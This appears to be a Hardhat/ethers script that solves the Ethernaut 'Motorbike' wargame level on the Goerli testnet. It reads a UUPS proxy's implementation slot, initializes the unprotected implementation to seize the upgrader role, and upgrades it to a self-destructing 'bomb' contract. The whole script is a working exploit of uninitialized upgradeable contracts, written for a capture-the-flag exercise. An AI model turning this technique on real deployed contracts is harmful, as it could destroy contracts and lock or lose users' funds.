import { Wallet } from "ethers";
import { ethers } from "hardhat";

const attackMotorbike = async () => {
    // change contract addresses here.
    const motorbikeAddress = "0xC4BB01C7AA492bdFF60f6989542d71DB7cb73Fd1"; //type "await contract.address()" in ethernaut console
    const playerAddress = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";
    const bombAddress = "0xF00f8E16b9c6588997a8bdE69e2749a52957d752";

    // Don't touch below
    // Engine contract is vulnerable since you can find the address of the logic implementation.
    // To know more, READ:
    // https://eip2535diamonds.substack.com/p/understanding-delegatecall-and-how
    // https://docs.soliditylang.org/en/v0.6.0/units-and-global-variables.html#contract-related
    // https://blog.openzeppelin.com/proxy-patterns/
    // https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786
    // https://docs.openzeppelin.com/contracts/4.x/api/proxy
    // https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol
    // Get _IMPLEMENTATION_SLOT of Motorbike
    console.log("Reading _IMPLEMENTATION_SLOT of Motorbike");
    const implAddress = await ethers.provider.getStorageAt(
        motorbikeAddress,
        "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
    );
    console.log(implAddress);
    console.log("Cleaning to get 20 bytes address only");
    const implAddress1 = "0x" + implAddress.slice(-40);
    console.log(implAddress1);
    console.log("Initializing at engine address");
    // const initializeData = ethers.provider.encodeFunctionSignature("initialize()");

    // await ethers.provider.sendTransaction({ from: player, to: implAddr, data: initializeData });

    const provider = await ethers.getDefaultProvider("goerli");
    /*Private Keys in .env file or hardcode here*/
    const PRIVATE_KEY = process.env.PRIVATE_KEY || "";
    const wallet = new Wallet(PRIVATE_KEY, provider);

    const funcSignInitialize = ["function initialize()"];
    const ifaceInitialize = new ethers.utils.Interface(funcSignInitialize);
    const initializeData = ifaceInitialize.encodeFunctionData("initialize()");
    const tx = await wallet.sendTransaction({
        from: playerAddress,
        to: implAddress1,
        data: initializeData,
    });
    console.log("Upgrader is now set as player");
    // TODO: check upgrader is now player
    const funcSignBomb = ["function bomb() public"];
    const ifaceBomb = new ethers.utils.Interface(funcSignBomb);
    const bombDAta = ifaceBomb.encodeFunctionData("bomb()");
    const upgradeParams = [bombAddress, bombDAta];
    const funcSignUpgrade = [
        "function upgradeToAndCall(address newImplementation, bytes memory data) external payable",
    ];
    const ifaceUpgrade = new ethers.utils.Interface(funcSignUpgrade);
    const upgradeSignature = ifaceUpgrade.encodeFunctionData("upgradeToAndCall", upgradeParams);

    // changing engine here to our own engine with seldestruct
    const tx1 = await wallet.sendTransaction({
        from: playerAddress,
        to: implAddress1,
        data: upgradeSignature,
    });
    const txReceipt1 = await tx1.wait();
    console.log(txReceipt1);
    console.log("Done...submit in ethernauts");
};

attackMotorbike()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
